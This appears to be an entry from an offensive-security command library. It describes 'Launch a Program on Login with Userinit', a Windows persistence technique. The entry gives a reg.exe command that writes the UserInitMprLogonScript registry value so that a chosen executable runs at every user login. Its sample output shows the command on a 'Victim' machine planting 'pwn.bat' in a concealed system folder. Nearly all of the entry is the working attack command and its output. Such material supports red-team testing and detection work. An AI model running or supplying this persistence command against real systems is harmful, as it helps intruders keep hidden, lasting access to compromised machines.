---
id: a5dfc78c-4be7-4cb2-9586-c6eff84cfac5
name: Launch a Program on Login with Userinit
type: command
executor: command_prompt
data: reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "$_FULL_PATH\$_TARGET.EXE"
  /t REG_SZ /f
output: 'PS C:\Users\Victim > reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript
  /d "C:\Windows\System32\spool\drivers\color\pwn.bat" /t REG_SZ /f

  The operation completed successfully.'
created_at: '2020-06-21T22:27:46.719543+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Launch a Program on Login with Userinit

```command_prompt
reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "$_FULL_PATH\$_TARGET.EXE" /t REG_SZ /f
```

## Expected Output

```
PS C:\Users\Victim > reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "C:\Windows\System32\spool\drivers\color\pwn.bat" /t REG_SZ /f
The operation completed successfully.
```


